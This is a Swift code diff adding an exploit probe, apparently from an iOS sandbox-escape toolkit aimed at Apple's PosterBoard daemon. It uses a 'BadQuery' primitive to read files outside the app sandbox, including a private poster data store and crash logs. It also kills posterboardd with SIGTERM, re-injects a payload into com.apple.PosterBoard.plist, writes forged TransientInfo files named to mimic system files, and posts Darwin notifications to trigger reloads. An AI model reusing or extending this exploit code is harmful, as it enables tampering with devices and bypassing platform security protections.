@@ -1606,6 +1606,296 @@ class SymHandler {
         return result
     }
 
+    // MARK: - Probe v6: proc_listpids + full versions/ tree + crash logs
+
+    @discardableResult
+    static func probe6() -> String {
+        var diag: [String] = ["=== PosterboarddProbe v6 \(Date()) iOS 26.5 ==="]
+        let fm = FileManager.default
+        let payload = posterboarddPayloadBase
+
+        diag.append("[0] bad_query: \(BadQuery.isAvailable ? "AVAILABLE" : "FAIL")")
+        guard BadQuery.isAvailable else { return pbSave(diag) }
+
+        let uuid: String
+        do { uuid = try BadQuery.findPosterBoardHash() } catch {
+            diag.append("PB hash: NOT FOUND (\(error))")
+            return pbSave(diag)
+        }
+        let fullContainer = BadQuery.applicationContainerPath(appHash: uuid)
+        diag.append("container: \(fullContainer)")
+
+        // [A] proc_listpids — sandbox blocks KERN_PROC_ALL but libproc may differ
+        diag.append("\n[A] proc_listpids PID scan:")
+        p6PidScan(diag: &diag)
+
+        // [B] Full recursive versions/{N}/ enumeration — find all 13 items
+        diag.append("\n[B] Full versions/ tree:")
+        let extBase = fullContainer + "/Library/Application Support/PRBPosterExtensionDataStore/61/Extensions"
+        p6FullVersionTree(extBase, fm: fm, diag: &diag)
+
+        // [C] Crash logs via bad_query
+        diag.append("\n[C] Crash logs:")
+        p6CrashLogs(fm: fm, diag: &diag)
+
+        // [D] Targeted write + Darwin trigger
+        diag.append("\n[D] Targeted write + trigger:")
+        p6TargetedWrite(fullContainer, fm: fm, payload: payload, diag: &diag)
+
+        // [E] posterboardd binary strings
+        diag.append("\n[E] posterboardd binary:")
+        pbReadBinaryStrings(fm: fm, diag: &diag)
+
+        return pbSave(diag)
+    }
+
+    private static func p6PidScan(diag: inout [String]) {
+        typealias ListPidsFn = @convention(c) (UInt32, UInt32, UnsafeMutableRawPointer?, Int32) -> Int32
+        typealias PidPathFn  = @convention(c) (Int32, UnsafeMutableRawPointer?, UInt32) -> Int32
+
+        var listpids: ListPidsFn?
+        var pidpathFn: PidPathFn?
+
+        for libPath in ["/usr/lib/libproc.dylib", "/usr/lib/libc.dylib",
+                        "/usr/lib/system/libsystem_darwin.dylib"] {
+            guard let lib = dlopen(libPath, RTLD_LAZY) else { continue }
+            if let ls = dlsym(lib, "proc_listpids"), let ps = dlsym(lib, "proc_pidpath") {
+                listpids  = unsafeBitCast(ls, to: ListPidsFn.self)
+                pidpathFn = unsafeBitCast(ps, to: PidPathFn.self)
+                diag.append("  loaded proc_listpids from \(libPath)")
+                break
+            }
+            dlclose(lib)
+        }
+
+        // Try proc_listpids first
+        if let lp = listpids, let pp = pidpathFn {
+            let cnt = lp(1 /* PROC_ALL_PIDS */, 0, nil, 0)
+            diag.append("  proc_listpids estimate=\(cnt)b (~\(cnt / Int32(MemoryLayout<pid_t>.size)) pids)")
+            if cnt > 0 {
+                let slotCount = Int(cnt) / MemoryLayout<pid_t>.size + 8
+                var pidBuf = [pid_t](repeating: 0, count: slotCount)
+                let actual = lp(1, 0, &pidBuf, Int32(slotCount * MemoryLayout<pid_t>.size))
+                let realCount = max(0, Int(actual) / MemoryLayout<pid_t>.size)
+                diag.append("  actual pids=\(realCount)")
+                var posterPids: [(pid_t, String)] = []
+                for i in 0..<realCount {
+                    let pid = pidBuf[i]; guard pid > 0 else { continue }
+                    var buf = [CChar](repeating: 0, count: 4096)
+                    if pp(Int32(pid), &buf, 4096) > 0 {
+                        let s = String(cString: buf)
+                        if s.lowercased().contains("poster") { posterPids.append((pid, s)) }
+                    }
+                }
+                diag.append("  poster[\(posterPids.count)]: \(posterPids.map { "\($0.0):\((($0.1) as NSString).lastPathComponent)" }.joined(separator: ", "))")
+                for (pid, path) in posterPids where (path as NSString).lastPathComponent.lowercased().contains("posterboard") {
+                    let rc = Darwin.kill(pid, SIGTERM)
+                    diag.append("  SIGTERM pid=\(pid) rc=\(rc) errno=\(Darwin.errno)")
+                }
+                return
+            }
+        }
+
+        // Fallback: brute-force PIDs 1..1200 via proc_pidpath
+        diag.append("  proc_listpids failed — brute-force PIDs 1..1200")
+        guard let lib2 = dlopen("/usr/lib/libproc.dylib", RTLD_LAZY),
+              let pSym = dlsym(lib2, "proc_pidpath") else {
+            diag.append("  proc_pidpath not found"); return
+        }
+        let ppFn = unsafeBitCast(pSym, to: PidPathFn.self)
+        var found: [(Int32, String)] = []
+        for pid: Int32 in 1...1200 {
+            var buf = [CChar](repeating: 0, count: 4096)
+            if ppFn(pid, &buf, 4096) > 0 {
+                let s = String(cString: buf)
+                if s.lowercased().contains("poster") { found.append((pid, s)) }
+            }
+        }
+        diag.append("  brute found \(found.count) poster processes")
+        for (pid, path) in found {
+            let nm = (path as NSString).lastPathComponent
+            diag.append("  pid=\(pid) \(nm)")
+            if nm.lowercased().contains("posterboard") {
+                let rc = Darwin.kill(pid, SIGTERM); diag.append("    SIGTERM rc=\(rc) errno=\(Darwin.errno)")
+            }
+        }
+    }
+
+    private static func p6FullVersionTree(_ extBase: String, fm: FileManager,
+                                           diag: inout [String]) {
+        guard let h = try? BadQuery.consume(path: extBase, create: true) else {
+            diag.append("  extBase NOACCESS"); return
+        }
+        defer { h.release() }
+        let extensions = (try? fm.contentsOfDirectory(atPath: extBase)) ?? []
+        for ext in extensions where !ext.hasPrefix(".") {
+            for subdir in ["configurations", "staticdescriptors"] {
+                let sdPath = "\(extBase)/\(ext)/\(subdir)"
+                guard let sh = try? BadQuery.consume(path: sdPath, create: true) else { continue }
+                defer { sh.release() }
+                let configs = (try? fm.contentsOfDirectory(atPath: sdPath)) ?? []
+                for config in configs where !config.hasPrefix(".") {
+                    let versPath = "\(sdPath)/\(config)/versions"
+                    guard let vh = try? BadQuery.consume(path: versPath, create: true) else { continue }
+                    defer { vh.release() }
+                    let vers = (try? fm.contentsOfDirectory(atPath: versPath)) ?? []
+                    for ver in vers where !ver.hasPrefix(".") {
+                        let vPath = "\(versPath)/\(ver)"
+                        diag.append("  [\(ext.prefix(44))]/\(subdir)/\(config.prefix(8))/v\(ver)")
+                        p6WalkDir(vPath, indent: "    ", fm: fm, diag: &diag)
+                    }
+                }
+            }
+        }
+    }
+
+    private static func p6WalkDir(_ path: String, indent: String, fm: FileManager,
+                                   diag: inout [String]) {
+        guard let h = try? BadQuery.consume(path: path, create: true) else { return }
+        defer { h.release() }
+        let items = (try? fm.contentsOfDirectory(atPath: path)) ?? []
+        for item in items where !item.hasPrefix(".") {
+            let sub = "\(path)/\(item)"
+            var isDir: ObjCBool = false
+            fm.fileExists(atPath: sub, isDirectory: &isDir)
+            if isDir.boolValue {
+                let cnt = (try? fm.contentsOfDirectory(atPath: sub))?.count ?? 0
+                diag.append("\(indent)\(item)/ [\(cnt)]")
+                p6WalkDir(sub, indent: indent + "  ", fm: fm, diag: &diag)
+            } else {
+                p6ReportFile(sub, name: item, indent: indent, fm: fm, diag: &diag)
+            }
+        }
+    }
+
+    private static func p6ReportFile(_ path: String, name: String, indent: String,
+                                      fm: FileManager, diag: inout [String]) {
+        guard let fh = try? BadQuery.consume(path: path, create: true) else {
+            diag.append("\(indent)\(name): NOACCESS"); return
+        }
+        defer { fh.release() }
+        guard let data = fm.contents(atPath: path) else {
+            diag.append("\(indent)\(name): unreadable"); return
+        }
+        let size = data.count
+        let isNSKA = size >= 8 && String(data: data.prefix(8), encoding: .ascii) == "bplist00"
+        if isNSKA {
+            var rootClass = "?"
+            if let pl = try? PropertyListSerialization.propertyList(from: data, options: [], format: nil) as? [String: Any],
+               let objs = pl["$objects"] as? [Any] {
+                for obj in objs {
+                    if let d = obj as? [String: Any],
+                       let cls = d["$classes"] as? [Any],
+                       let first = cls.first as? String, first != "NSObject" {
+                        rootClass = first; break
+                    }
+                }
+            }
+            let hit = rootClass.contains("PRSPoster") ? " *** HIT ***" : ""
+            diag.append("\(indent)[NSKA:\(rootClass)] \(name) (\(size)b)\(hit)")
+        } else {
+            let isBplist = size >= 6 && String(data: data.prefix(6), encoding: .ascii) == "bplist"
+            if isBplist {
+                if let pl = try? PropertyListSerialization.propertyList(from: data, options: [], format: nil) {
+                    diag.append("\(indent)[PLIST] \(name) (\(size)b): \(String(describing: pl).prefix(100))")
+                } else {
+                    diag.append("\(indent)[BPLIST15] \(name) (\(size)b)")
+                }
+            } else if let s = String(data: data, encoding: .utf8), s.count < 200 {
+                diag.append("\(indent)[TEXT] \(name) (\(size)b): \(s.prefix(80))")
+            } else {
+                let hdr = data.prefix(8).map { String(format: "%02x", $0) }.joined()
+                diag.append("\(indent)[BIN] \(name) (\(size)b) hdr=\(hdr)")
+            }
+        }
+    }
+
+    private static func p6CrashLogs(fm: FileManager, diag: inout [String]) {
+        let crashDir = "/var/mobile/Library/Logs/CrashReporter"
+        guard let h = try? BadQuery.consume(path: crashDir, create: true) else {
+            diag.append("  NOACCESS"); return
+        }
+        defer { h.release() }
+        let items = ((try? fm.contentsOfDirectory(atPath: crashDir)) ?? []).sorted()
+        diag.append("  total: \(items.count) files")
+        let pbFiles = items.filter { $0.lowercased().contains("poster") }
+        diag.append("  posterboard: \(pbFiles.count)")
+        for f in pbFiles.suffix(5) {
+            let p = "\(crashDir)/\(f)"
+            if let fh = try? BadQuery.consume(path: p, create: true),
+               let data = fm.contents(atPath: p),
+               let text = String(data: data, encoding: .utf8) {
+                fh.release()
+                diag.append("  --- \(f) ---")
+                diag.append(String(text.prefix(2000)))
+            } else { diag.append("  \(f): unreadable") }
+        }
+        let sbFiles = items.filter { $0.lowercased().contains("springboard") }.suffix(3)
+        if !sbFiles.isEmpty { diag.append("  recent SpringBoard: \(sbFiles.joined(separator: ", "))") }
+    }
+
+    private static func p6TargetedWrite(_ container: String, fm: FileManager,
+                                         payload: Data, diag: inout [String]) {
+        // Verify com.apple.PosterBoard.plist still holds our injected payload
+        let prefPath = container + "/Library/Preferences/com.apple.PosterBoard.plist"
+        if let h = try? BadQuery.consume(path: prefPath, create: true),
+           let data = fm.contents(atPath: prefPath) {
+            h.release()
+            let isOurs = data.count == payload.count
+            diag.append("  PosterBoard.plist \(data.count)b isOurPayload=\(isOurs)")
+            if !isOurs {
+                let ok = (payload as NSData).write(toFile: prefPath, atomically: true)
+                diag.append("  re-inject: \(ok ? "OK" : "FAIL")")
+            }
+        } else { diag.append("  PosterBoard.plist: NOACCESS") }
+
+        // Write a new TransientInfo file — posterboardd may kqueue-watch the directory
+        let transientDir = container + "/tmp/PFTemporaryDirectory"
+        if let th = try? BadQuery.consume(path: transientDir, create: true) {
+            defer { th.release() }
+            let existing = ((try? fm.contentsOfDirectory(atPath: transientDir)) ?? [])
+                .filter { !$0.hasPrefix(".") }
+            diag.append("  TransientDir: \(existing.count) files")
+            // Extract boot session UUID from an existing filename to mimic naming
+            var bootUUID = UUID().uuidString.uppercased()
+            for f in existing where f.hasPrefix("TransientInfo-") && f.hasSuffix(".plist") {
+                let inner = String(f.dropFirst("TransientInfo-".count).dropLast(".plist".count))
+                if inner.count >= 36 {
+                    let tail = String(inner.suffix(36))
+                    let parts = tail.components(separatedBy: "-")
+                    if parts.count == 5 && parts[0].count == 8 && parts[1].count == 4 &&
+                       parts[2].count == 4 && parts[3].count == 4 && parts[4].count == 12 {
+                        bootUUID = tail.uppercased(); break
+                    }
+                }
+            }
+            let hexChars = Array("0123456789abcdef")
+            let sha1 = String((0..<64).map { _ in hexChars.randomElement()! })
+            let sha2 = String((0..<64).map { _ in hexChars.randomElement()! })
+            let newName = "TransientInfo-\(sha1)-\(sha2)-\(bootUUID).plist"
+            let newPath = "\(transientDir)/\(newName)"
+            let ok = (payload as NSData).write(toFile: newPath, atomically: true)
+            diag.append("  new TransientInfo: \(ok ? "WRITE OK" : "FAIL") bootUUID=\(bootUUID)")
+        } else { diag.append("  TransientDir: NOACCESS") }
+
+        // Post Darwin notifications after writes
+        let center = CFNotificationCenterGetDarwinNotifyCenter()
+        for n in ["com.apple.posterboard.didChangeConfiguration",
+                  "com.apple.PosterBoard.configurationDidChange",
+                  "com.apple.posterboardd.posterDataChanged",
+                  "com.apple.springboard.posterboard.wallpapersDidChange",
+                  "PRBPosterExtensionDataStoreChanged",
+                  "com.apple.posterboard.reload"] {
+            CFNotificationCenterPostNotification(center, CFNotificationName(n as CFString), nil, nil, true)
+        }
+        diag.append("  posted 6 notifications")
+
+        // Short delay then re-check PID
+        Thread.sleep(forTimeInterval: 2.0)
+        diag.append("  re-check PID after 2s:")
+        p6PidScan(diag: &diag)
+    }
+
     private static func pbReadBinaryStrings(fm: FileManager, diag: inout [String]) {
         for binPath in ["/usr/libexec/posterboardd", "/usr/sbin/posterboardd",
                         "/usr/libexec/posterboardd.development"] {
